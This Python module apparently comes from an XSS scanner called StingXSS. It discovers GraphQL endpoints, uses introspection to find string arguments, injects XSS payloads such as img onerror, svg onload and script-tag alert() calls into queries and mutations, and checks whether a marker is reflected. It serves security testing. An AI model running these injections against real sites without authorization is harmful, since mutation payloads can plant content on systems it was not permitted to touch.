# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""GraphQL endpoint discovery and XSS injection testing.

Strategy
--------
1. Probe common GraphQL endpoint paths (``/graphql``, ``/api/graphql``, etc.).
2. Send an introspection query to confirm the endpoint is a real GraphQL API
   and to discover injectable string-typed fields.
3. Inject XSS payloads into string arguments of discovered mutations/queries.
4. Check whether the marker is reflected in the JSON response.

GraphQL-specific finding pattern: reflected XSS inside a JSON response body
is confirmed when the marker appears inside a string value of the response.
"""

from __future__ import annotations

import json
import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

from ..reporter import GraphqlFinding

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_GRAPHQL_PATHS = [
    "/graphql",
    "/api/graphql",
    "/v1/graphql",
    "/v2/graphql",
    "/graphql/v1",
    "/graphql/v2",
    "/query",
    "/api/query",
    "/gql",
]

_INTROSPECTION = (
    '{"query":"{ __schema { queryType { name } mutationType { name } '
    'types { name kind fields { name args { name type { name kind ofType { name kind } } } } } } }"}'
)

# Minimal introspection to just check the endpoint is alive
_PING = '{"query":"{ __typename }"}'

_MARKER_RE = re.compile(r'"([^"]*StingXSS[^"]*)"')

_STING_MARKER_PREFIX = "StingXSS_gql_"


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def discover_endpoints(base_url: str, injector) -> List[str]:
    """Probe common paths and return confirmed GraphQL endpoint URLs.

    Args:
        base_url: Root URL of the target (e.g. ``https://example.com``).
        injector: StingXSS ``Injector`` instance used for HTTP requests.

    Returns:
        List of confirmed GraphQL endpoint URLs.
    """
    origin = _origin(base_url)
    found: List[str] = []

    for path in _GRAPHQL_PATHS:
        url = origin + path
        if _is_graphql(url, injector):
            found.append(url)

    return found


def check(
    endpoint_url: str,
    injector,
    marker: str = "",
    level: int = 1,
) -> List[GraphqlFinding]:
    """Inject XSS payloads into GraphQL string arguments and check for reflection.

    Args:
        endpoint_url: Confirmed GraphQL endpoint URL.
        injector:     StingXSS ``Injector`` instance.
        marker:       Marker string to embed in payloads (generated if empty).
        level:        Payload depth: 1 = basic, 2 = more, 3 = all.

    Returns:
        List of ``GraphqlFinding`` (possibly empty).
    """
    if not marker:
        import random
        marker = _STING_MARKER_PREFIX + "".join(random.choices("abcdef0123456789", k=6))

    findings: List[GraphqlFinding] = []

    # Fetch schema to find injectable fields
    fields = _get_injectable_fields(endpoint_url, injector)
    if not fields:
        # Fall back to generic blind injection when introspection is disabled
        fields = _DEFAULT_FIELDS

    payloads = _xss_payloads(marker, level)

    for op_type, op_name, field_name in fields:
        for payload in payloads:
            gql, variables = _build_query(op_type, op_name, field_name, payload)
            finding = _try_inject(
                endpoint_url, injector, gql, variables,
                op_type, field_name, payload, marker,
            )
            if finding:
                findings.append(finding)
                break  # one finding per field is enough

    return findings


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _origin(url: str) -> str:
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"


def _is_graphql(url: str, injector) -> bool:
    """Return True if *url* responds to a GraphQL ping."""
    try:
        resp = injector.post(
            url,
            json_body={"query": "{ __typename }"},
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code >= 500:
            return False
        body = resp.text
        return '"__typename"' in body or '"data"' in body or '"errors"' in body
    except Exception:
        return False


def _get_injectable_fields(
    url: str,
    injector,
) -> List[Tuple[str, str, str]]:
    """Run introspection and return (op_type, op_name, field_name) triples
    for string-typed arguments on Query and Mutation types."""
    try:
        resp = injector.post(
            url,
            json_body={"query": (
                "{ __schema { queryType { name } mutationType { name } "
                "types { name kind fields { name args { name "
                "type { name kind ofType { name kind } } } } } } }"
            )},
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code >= 400:
            return []
        data = resp.json()
    except Exception:
        return []

    schema = (data.get("data") or {}).get("__schema") or {}
    types  = schema.get("types") or []

    qt_name = (schema.get("queryType") or {}).get("name", "Query")
    mt_name = (schema.get("mutationType") or {}).get("name", "Mutation")

    results: List[Tuple[str, str, str]] = []
    for t in types:
        t_name = t.get("name", "")
        if t_name.startswith("__") or t.get("kind") != "OBJECT":
            continue

        op_type = ""
        if t_name == qt_name:
            op_type = "query"
        elif t_name == mt_name:
            op_type = "mutation"
        else:
            continue

        for field in (t.get("fields") or []):
            for arg in (field.get("args") or []):
                if _is_string_type(arg.get("type") or {}):
                    results.append((op_type, field.get("name", ""), arg.get("name", "")))
                    if len(results) >= 20:
                        return results

    return results


def _is_string_type(type_obj: Dict[str, Any]) -> bool:
    """Recursively check whether a GraphQL type resolves to String/ID."""
    name = type_obj.get("name") or ""
    if name in ("String", "ID"):
        return True
    inner = type_obj.get("ofType")
    if inner and isinstance(inner, dict):
        return _is_string_type(inner)
    return False


# Default field targets when introspection is disabled
_DEFAULT_FIELDS: List[Tuple[str, str, str]] = [
    ("query", "search", "query"),
    ("query", "search", "q"),
    ("query", "user", "name"),
    ("query", "item", "id"),
    ("mutation", "createComment", "body"),
    ("mutation", "updateProfile", "bio"),
    ("mutation", "sendMessage", "content"),
]


def _build_query(
    op_type:    str,
    op_name:    str,
    field_name: str,
    value:      str,
) -> Tuple[str, Dict[str, str]]:
    """Build a GraphQL query/mutation with *value* as an inline string literal."""
    safe_op = re.sub(r"[^a-zA-Z0-9_]", "", op_name)
    safe_arg = re.sub(r"[^a-zA-Z0-9_]", "", field_name)
    escaped = value.replace("\\", "\\\\").replace('"', '\\"')
    gql = f'{op_type} StingTest {{ {safe_op}({safe_arg}: "{escaped}") }}'
    return gql, {}


def _try_inject(
    url:        str,
    injector,
    gql:        str,
    variables:  Dict[str, str],
    op_type:    str,
    field_name: str,
    payload:    str,
    marker:     str,
) -> Optional[GraphqlFinding]:
    try:
        resp = injector.post(
            url,
            json_body={"query": gql, "variables": variables},
            headers={"Content-Type": "application/json"},
        )
        body = resp.text
    except Exception:
        return None

    if marker not in body:
        return None

    # Extract a short evidence snippet around the marker
    idx = body.find(marker)
    evidence = body[max(0, idx - 40): idx + len(marker) + 40].strip()

    return GraphqlFinding(
        url=url,
        endpoint=url,
        field=field_name,
        operation=op_type,
        payload=payload,
        confirmed=True,
        evidence=evidence,
    )


def _xss_payloads(marker: str, level: int) -> List[str]:
    """Return XSS payloads for injection into a JSON string field."""
    basic = [
        f"<img src=x onerror=alert('{marker}')>",
        f"<svg onload=alert('{marker}')>",
        f"\"><img src=x onerror=alert('{marker}')>",
    ]
    extra = [
        f"javascript:alert('{marker}')",
        f"<script>alert('{marker}')</script>",
        f"'-alert('{marker}')-'",
        f"</script><script>alert('{marker}')</script>",
    ]
    if level == 1:
        return basic
    if level == 2:
        return basic + extra[:2]
    return basic + extra
